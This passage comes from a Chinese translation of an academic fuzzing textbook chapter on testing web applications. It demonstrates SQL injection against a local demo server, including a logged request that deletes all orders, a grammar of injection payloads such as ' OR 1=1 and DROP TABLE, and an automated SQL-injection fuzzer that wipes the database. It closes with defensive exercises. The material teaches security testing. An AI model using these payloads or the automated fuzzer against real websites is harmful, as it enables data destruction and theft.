127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order?item=drill&name=Jane',+'x',+'x',+'x')%3B+DELETE+FROM+orders%3B+--&email=j.doe%40example.com&city=New+York&zip=14083 HTTP/1.1" 200 -

```

所有订单现在都不见了：

```py
print(db.execute("SELECT * FROM orders").fetchall()) 
```

```py
[]

```

这种效果也在这个非常受欢迎的 XKCD 漫画中得到了说明[链接](https://xkcd.com/327/)：

![`xkcd.com/327/`](img/8280ec9ae131d70c215e85006e2c6c91.png){width=100%}

即使我们没有能够执行任意命令，能够破坏订单数据库也提供了许多恶作剧行为的可能性。例如，我们可以使用现有人员的地址和匹配的信用卡号进行验证并提交订单，然后只将订单送到我们选择的地址。我们还可以使用 SQL 注入注入 HTML 和 JavaScript 代码，就像上面那样，绕过针对这些域的可能的清理。

为了避免这种效果，补救措施是对所有第三方输入进行*清理*——输入中的任何字符都不能被解释为纯 HTML、JavaScript 或 SQL。这是通过正确地*引用*和*转义*输入来实现的。练习提供了一些关于要做什么的说明。

### 泄露内部信息

为了构建上述 SQL 查询，我们使用了*内部信息*——例如，我们知道表的名字以及其结构。当然，攻击者不会知道这些，因此无法运行攻击，对吧？不幸的是，我们首先泄露了所有这些信息。我们的服务器产生的错误消息揭示了我们所需要的一切：

```py
answer = webbrowser(urljoin(httpd_url, "/order"), mute=True) 
```

```py
HTML(answer) 
```

**内部服务器错误**

服务器遇到了内部错误。请访问我们的订单表单:
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'item'

```

当然，避免通过失败泄露信息最好的方法是不出错。但如果出错，*让攻击者难以在攻击和失败之间建立联系*。特别是，

+   不要产生“内部错误”消息（当然，更不能包含内部信息）。

+   不要变得无响应；只需回到主页并要求用户提供正确数据。

再次强调，练习提供了一些修复服务器的指导。

如果你能够操纵服务器不仅改变信息，还能*检索*信息，你就可以通过访问特殊*表*（也称为*数据字典*）来了解表名和结构，这些特殊表是数据库服务器存储其元数据的地方。例如，在 MySQL 服务器中，特殊表 `information_schema` 存储了数据库和表的名字、列的数据类型或访问权限。

## 完全自动化的 Web 攻击

到目前为止，我们已经使用我们手动编写的订单语法演示了上述攻击。然而，这些攻击也适用于生成的语法。我们通过添加一些常见的 SQL 注入攻击来扩展 `HTMLGrammarMiner`：

```py
class SQLInjectionGrammarMiner(HTMLGrammarMiner):
  """Demonstration of an automatic SQL Injection attack grammar miner"""

    # Some common attack schemes
    ATTACKS: List[str] = [
        "<string>' <sql-values>); <sql-payload>; <sql-comment>",
        "<string>' <sql-comment>",
        "' OR 1=1<sql-comment>'",
        "<number> OR 1=1",
    ]

    def __init__(self, html_text: str, sql_payload: str):
  """Constructor.
 `html_text` - the HTML form to be attacked
 `sql_payload` - the SQL command to be executed
 """
        super().__init__(html_text)

        self.QUERY_GRAMMAR = extend_grammar(self.QUERY_GRAMMAR, {
            "<text>": ["<string>", "<sql-injection-attack>"],
            "<number>": ["<digits>", "<sql-injection-attack>"],
            "<checkbox>": ["<_checkbox>", "<sql-injection-attack>"],
            "<email>": ["<_email>", "<sql-injection-attack>"],
            "<sql-injection-attack>": [
                cgi_encode(attack, "<->") for attack in self.ATTACKS
            ],
            "<sql-values>": ["", cgi_encode("<sql-values>, '<string>'", "<->")],
            "<sql-payload>": [cgi_encode(sql_payload)],
            "<sql-comment>": ["--", "#"],
        }) 
```

```py
html_miner = SQLInjectionGrammarMiner(
    html_text, sql_payload="DROP TABLE orders") 
```

```py
grammar = html_miner.mine_grammar()
grammar 
```

```py
{'<start>': ['<action>?<query>'],
 '<string>': ['<letter>', '<letter><string>'],
 '<letter>': ['<plus>', '<percent>', '<other>'],
 '<plus>': ['+'],
 '<percent>': ['%<hexdigit-1><hexdigit>'],
 '<hexdigit>': ['0',
  '1',
  '2',
  '3',
  '4',
  '5',
  '6',
  '7',
  '8',
  '9',
  'a',
  'b',
  'c',
  'd',
  'e',
  'f'],
 '<other>': ['0', '1', '2', '3', '4', '5', 'a', 'b', 'c', 'd', 'e', '-', '_'],
 '<text>': ['<string>', '<sql-injection-attack>'],
 '<number>': ['<digits>', '<sql-injection-attack>'],
 '<digits>': ['<digit>', '<digits><digit>'],
 '<digit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
 '<checkbox>': ['<_checkbox>', '<sql-injection-attack>'],
 '<_checkbox>': ['on', 'off'],
 '<email>': ['<_email>', '<sql-injection-attack>'],
 '<_email>': ['<string>%40<string>'],
 '<hexdigit-1>': ['3', '4', '5', '6', '7'],
 '<submit>': [''],
 '<sql-injection-attack>': ["<string>'+<sql-values>)%3b+<sql-payload>%3b+<sql-comment>",
  "<string>'+<sql-comment>",
  "'+OR+1%3d1<sql-comment>'",
  '<number>+OR+1%3d1'],
 '<sql-values>': ['', "<sql-values>,+'<string>'"],
 '<sql-payload>': ['DROP+TABLE+orders'],
 '<sql-comment>': ['--', '#'],
 '<action>': ['/order'],
 '<item>': ['item=<item-value>'],
 '<item-value>': ['tshirt', 'drill', 'lockset'],
 '<name>': ['name=<text>'],
 '<email-1>': ['email=<email>'],
 '<city>': ['city=<text>'],
 '<zip>': ['zip=<number>'],
 '<terms>': ['terms=<checkbox>'],
 '<submit-1>': ['submit=<submit>'],
 '<query>': ['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']}

```

```py
grammar["<text>"] 
```

```py
['<string>', '<sql-injection-attack>']

```

我们看到现在有几个字段被测试以检查漏洞：

```py
sql_fuzzer = GrammarFuzzer(grammar)
sql_fuzzer.fuzz() 
```

```py
"/order?item=lockset&name=4+OR+1%3d1&email=%66%40%3ba&city=%7a&zip=99&terms=1'+#&submit="

```

```py
print(db.execute("SELECT * FROM orders").fetchall()) 
```

```py
[]

```

```py
contents = webbrowser(urljoin(httpd_url,
                              "/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104")) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1" 200 -

```

```py
def orders_db_is_empty():
  """Return True if the orders database is empty (= we have been successful)"""

    try:
        entries = db.execute("SELECT * FROM orders").fetchall()
    except sqlite3.OperationalError:
        return True
    return len(entries) == 0 
```

```py
orders_db_is_empty() 
```

```py
False

```

我们创建了一个名为 `SQLInjectionFuzzer` 的自动执行所有操作的模糊测试工具。

```py
class SQLInjectionFuzzer(WebFormFuzzer):
  """Simple demonstrator of a SQL Injection Fuzzer"""

    def __init__(self, url: str, sql_payload : str ="", *,
                 sql_injection_grammar_miner_class: Optional[type] = None,
                 **kwargs):
  """Constructor.
 `url` - the Web page (with a form) to retrieve
 `sql_payload` - the SQL command to execute
 `sql_injection_grammar_miner_class` - the miner to be used
 (default: SQLInjectionGrammarMiner)
 Other keyword arguments are passed to `WebFormFuzzer`.
 """
        self.sql_payload = sql_payload

        if sql_injection_grammar_miner_class is None:
            sql_injection_grammar_miner_class = SQLInjectionGrammarMiner
        self.sql_injection_grammar_miner_class = sql_injection_grammar_miner_class

        super().__init__(url, **kwargs)

    def get_grammar(self, html_text):
  """Obtain a grammar with SQL injection commands"""

        grammar_miner = self.sql_injection_grammar_miner_class(
            html_text, sql_payload=self.sql_payload)
        return grammar_miner.mine_grammar() 
```

```py
sql_fuzzer = SQLInjectionFuzzer(httpd_url, "DELETE FROM orders")
web_runner = WebRunner(httpd_url)
trials = 1

while True:
    sql_fuzzer.run(web_runner)
    if orders_db_is_empty():
        break
    trials += 1 
```

```py
trials 
```

```py
68

```

我们的攻击成功了！在不到一秒钟的测试后，我们的数据库已经为空：

```py
orders_db_is_empty() 
```

```py
True

```

再次注意可能的自动化程度：我们可以

+   爬取主机的网页以查找可能的表单

+   自动识别表单字段和可能的值

+   将 SQL（或 HTML，或 JavaScript）注入到这些字段中的任何一个

所有这些操作都是全自动的，只需要提供网站的 URL 即可。

坏消息是，有了上述工具集，任何人都可以攻击网站。更糟糕的是，这种渗透测试每天都在进行，针对每个网站。好消息是，在阅读了这一章之后，你现在对每天如何攻击 Web 服务器有了概念——以及作为 Web 服务器维护者，你能够和应该做什么来防止这种情况。

## 经验教训

+   用户界面（无论是在网页上还是其他地方）应该使用*预期*和*意外*的值进行测试。

+   可以从用户界面*挖掘语法*，从而允许进行广泛的测试。

+   对输入进行后续的*清理*可以防止常见的攻击，如代码和 SQL 注入。

+   不要尝试自己编写 Web 服务器，因为你很可能会重复别人的所有错误。

我们已经完成了，所以我们可以清理：

```py
clear_httpd_messages() 
```

```py
httpd_process.terminate() 
```

## 下一步

从这里，下一步是 GUI 模糊测试，从 HTML 和 Web 用户界面到通用用户界面（包括 JavaScript 和移动用户界面）。

如果你对安全测试感兴趣，不要错过我们的信息流章节，展示如何系统地检测信息泄露；这也解决了 SQL 注入攻击的问题。

## 背景

[维基百科上的 Web 应用安全页面](https://en.wikipedia.org/wiki/Web_application_security)是任何构建、维护或测试 Web 应用的人必读的内容。在 2012 年，跨站脚本和 SQL 注入（本章讨论的内容），占 Web 应用漏洞的 50%以上。

[维基百科上的渗透测试页面](https://en.wikipedia.org/wiki/Penetration_test)提供了关于渗透测试历史的全面概述，以及漏洞集合。

[OWASP Zed Attack Proxy 项目](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)（ZAP）是一个开源网站安全扫描器，包括上述讨论的几个功能以及更多。

## 练习

### 练习 1：修复服务器

创建一个`BetterHTTPRequestHandler`类，修复`SimpleHTTPRequestHandler`的几个问题：

#### 第一部分：静默失败

设置服务器，使其不泄露内部信息——特别是跟踪信息和 HTTP 状态码。

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises)来练习并查看解决方案。

#### 第二部分：清理后的 HTML

设置服务器，使其不受 HTML 和 JavaScript 注入攻击的威胁，特别是通过使用`html.escape()`等方法来转义显示时特殊字符。

```py
import [html](https://docs.python.org/3/library/html.html) 
```

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises)来练习并查看解决方案。

#### 第三部分：清理后的 SQL

设置服务器，使其不受 SQL 注入攻击的威胁，特别是通过使用*SQL 参数替换*。

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises)来练习并查看解决方案。

#### 第四部分：健壮的服务器

设置服务器，使其不会因为无效或缺失的字段而崩溃。

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises)来练习并查看解决方案。

#### 第五部分：测试它！

测试你的改进后的服务器，看看你的措施是否成功。

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises)来练习并查看解决方案。

### 练习 2：保护服务器

假设您无法更改服务器代码。创建一个在将 URL 传递给服务器之前运行的 *过滤器*。

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises) 来完成练习并查看解决方案。

#### 第一部分：黑名单过滤器

设置一个名为 `blacklist(url)` 的过滤器函数，对于不应该到达服务器的 URL 返回 `False`。检查 URL 是否包含 HTML、JavaScript 或 SQL 片段。

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises) 来完成练习并查看解决方案。

#### 第二部分：白名单过滤器

设置一个名为 `whitelist(url)` 的过滤器函数，对于允许到达服务器的 URL 返回 `True`。检查 URL 是否符合预期；为此目的使用解析器和专用语法。

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises) 来完成练习并查看解决方案。

### [使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises) 来完成练习并查看解决方案。

为了填写表单，模糊器可以在生成输入值方面更加智能。从 HTML 5 开始，输入字段可以有一个 `pattern` 属性，定义一个输入值必须满足的 *正则表达式*。例如，一个 5 位邮政编码可以通过以下模式定义：

```py
<input type="text" pattern="[0-9][0-9][0-9][0-9][0-9]"> 
```

从 HTML 页面中提取这些模式，并将它们转换为等效的语法生成规则，确保只有满足这些模式的输入才会被生成。

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises) 来完成练习并查看解决方案。

### 练习 4：基于覆盖的 Web 模糊测试

将上述模糊器与基于覆盖的和基于搜索的方法相结合，以最大化功能和代码覆盖范围。

[使用笔记本](https://mybinder.org/v2/gh/uds-se/fuzzingbook/HEAD?labpath=docs%2Fnotebooks/WebFuzzer.ipynb#Exercises) 来完成练习并查看解决方案。

![Creative Commons License](img/2f3faa36146c6fb38bbab67add09aa5f.png) 本项目的内容受[Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License](https://creativecommons.org/licenses/by-nc-sa/4.0/)许可。作为内容一部分的源代码，以及用于格式化和显示该内容的源代码，受[MIT License](https://github.com/uds-se/fuzzingbook/blob/master/LICENSE.md#mit-license)许可。 [最后修改：2024-01-31 17:32:56+01:00](https://github.com/uds-se/fuzzingbook/commits/master/notebooks/WebFuzzer.ipynb) • 引用 • [版权信息](https://cispa.de/en/impressum)

## 如何引用这项工作

安德烈亚斯·策勒，拉胡尔·戈皮纳特，马塞尔·博 hme，戈登·弗莱泽，以及克里斯蒂安·霍勒："[测试 Web 应用程序](https://www.fuzzingbook.org/html/WebFuzzer.html)"。收录于安德烈亚斯·策勒，拉胡尔·戈皮纳特，马塞尔·博 hme，戈登·弗莱泽，以及克里斯蒂安·霍勒所著的"[模糊测试书籍](https://www.fuzzingbook.org/)"中。[`www.fuzzingbook.org/html/WebFuzzer.html`](https://www.fuzzingbook.org/html/WebFuzzer.html)。检索时间：2024-01-31 17:32:56+01:00.

```py
@incollection{fuzzingbook2024:WebFuzzer,
    author = {Andreas Zeller and Rahul Gopinath and Marcel B{\"o}hme and Gordon Fraser and Christian Holler},
    booktitle = {The Fuzzing Book},
    title = {Testing Web Applications},
    year = {2024},
    publisher = {CISPA Helmholtz Center for Information Security},
    howpublished = {\url{https://www.fuzzingbook.org/html/WebFuzzer.html}},
    note = {Retrieved 2024-01-31 17:32:56+01:00},
    url = {https://www.fuzzingbook.org/html/WebFuzzer.html},
    urldate = {2024-01-31 17:32:56+01:00}
}

```
